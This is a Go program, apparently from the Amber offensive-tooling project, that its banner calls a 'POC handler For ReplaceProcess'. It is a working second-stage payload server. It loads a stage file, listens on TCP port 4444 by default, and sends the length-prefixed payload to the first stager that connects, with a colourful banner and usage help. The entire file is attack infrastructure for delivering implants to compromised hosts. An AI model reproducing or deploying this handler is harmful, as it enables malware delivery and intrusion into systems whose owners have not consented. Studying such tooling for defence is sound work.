package main


import "github.com/fatih/color"
import "encoding/binary"
import "io/ioutil"
import "strconv"
import "net"
import "fmt"
import "os"



var	Red *color.Color = color.New(color.FgRed)
var	BoldRed *color.Color = Red.Add(color.Bold)
var	Blue *color.Color = color.New(color.FgBlue)
var	BoldBlue *color.Color = Blue.Add(color.Bold)
var	Yellow *color.Color = color.New(color.FgYellow)
var	BoldYellow *color.Color = Yellow.Add(color.Bold)
var	Green *color.Color = color.New(color.FgGreen)
var	BoldGreen *color.Color = Green.Add(color.Bold)


const VERSION string = "1.0.0"


func main() {

	var PORT string = "4444"

	ARGS := os.Args[1:]
	if len(ARGS) == 0 || ARGS[0] == "--help" || ARGS[0] == "-h"{
	Banner()
	Help()
	os.Exit(0)
	}

	Banner()

  	for i := 0; i < len(ARGS); i++{
  		if ARGS[i] == "-p" || ARGS[i] == "--port" {
  			tmp, Err := strconv.Atoi(ARGS[i+1])
      		if Err != nil || tmp < 0 || tmp > 65535 {
        		BoldRed.Println("\n[!] ERROR: Invalid port number.\n")
        		fmt.Println(Err)
        		os.Exit(1)
      		}else{
        		PORT = ARGS[i+1]
      		} 
  		}
  	}

  	File, Err := ioutil.ReadFile(ARGS[0])
  	if Err != nil {
  		BoldRed.Println("\n[!] ERROR: Can't open the file :(")
  		os.Exit(1)
  	}

  	stageSize := make([]byte, 4)
    binary.LittleEndian.PutUint32(stageSize, uint32(len(File)))

  	sock, sockErr := net.Listen("tcp", ":"+PORT)
  	if sockErr != nil {
        BoldRed.Println("\n[!] ERROR: Invalid port number.\n")
       	fmt.Println(sockErr)
       	os.Exit(1) 			
  	}
  	BoldYellow.Print("\n[*] Listening on port ",PORT,"\n")
  	conn, connErr := sock.Accept()
  	if connErr != nil {
        BoldRed.Println("\n[!] ERROR: Connection error.\n")
       	fmt.Println(connErr)
       	os.Exit(1) 			
  	}
  	BoldYellow.Print("[*] Sending second stage (",len(File)," bytes)\n")  	
  	conn.Write([]byte(stageSize))
  	conn.Write(File)

  	BoldGreen.Println("\n[+] Stage send !")
}



func Banner() {

  	var BANNER string = `

//                
// AMBER ___                    .___.__                
//  /   |   \_____    ____    __| _/|  |   ___________ 
// /    ~    \__  \  /    \  / __ | |  | _/ __ \_  __ \
// \    Y    // __ \|   |  \/ /_/ | |  |_\  ___/|  | \/
//  \___|_  /(____  /___|  /\____ | |____/\___  >__|   
//        \/      \/     \/      \/           \/       
// 
//  POC handler For ReplaceProcess                                             
`
  BoldRed.Print(BANNER)
  BoldBlue.Print("\n# Version: ")
  BoldGreen.Println(VERSION)
  BoldBlue.Print("# Source: ")
  BoldGreen.Println("github.com/EgeBalci/Amber")
  
}
	
func Help() {
   var Help string = `

USAGE: 
  handler <stage> [port]

EXAMPLE:
  handler file.stage 4444

`
  color.Green(Help)

}
